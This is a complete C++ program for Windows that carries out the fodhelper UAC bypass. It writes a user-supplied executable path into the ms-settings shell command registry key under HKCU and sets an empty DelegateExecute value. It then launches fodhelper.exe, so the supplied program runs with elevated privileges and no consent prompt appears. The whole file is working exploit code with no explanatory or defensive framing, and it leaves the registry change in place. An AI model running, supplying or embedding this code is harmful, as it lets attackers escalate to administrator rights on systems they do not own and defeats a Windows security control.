#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string>


#pragma comment(lib, "advapi32.lib")

bool KillProcessByName(const char* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                    printf("Terminated process: %s\n", processName);
                }
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return true;
}

int main(int argc, char* argv[]) {
    if (argc != 3 || strcmp(argv[1], "--exe-path") != 0) {
        printf("Usage: %s --exe-path <path_to_exe>\n", argv[0]);
        return 1;
    }
    const char* exePath = argv[2];
    const char* registryPath = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    const char* delegateKey = "DelegateExecute";
    const char* system32Path = "C:\\Windows\\System32\\fodhelper.exe";

    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, registryPath, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        printf("Failed to create/open registry key.\n");
        return 1;
    }

    if (RegSetValueEx(hKey, "", 0, REG_SZ, (const BYTE*)exePath, strlen(exePath) + 1) != ERROR_SUCCESS) {
        printf("Failed to set registry value.\n");
        RegCloseKey(hKey);
        return 1;
    }

    if (RegSetValueEx(hKey, delegateKey, 0, REG_SZ, (const BYTE*)"", 1) != ERROR_SUCCESS) {
        printf("Failed to set DelegateExecute.\n");
        RegCloseKey(hKey);
        return 1;
    }

    RegCloseKey(hKey);
    printf("Registry updated successfully.\n");

    KillProcessByName(exePath);

    SHELLEXECUTEINFO sei = { sizeof(sei) };
    sei.lpVerb = "runas";
    sei.lpFile = system32Path;
    sei.nShow = SW_NORMAL;

    if (!ShellExecuteEx(&sei)) {
        printf("Failed to execute fodhelper.exe\n");
        return 1;
    }

    printf("Successfully executed fodhelper.exe.\n");
    return 0;

}

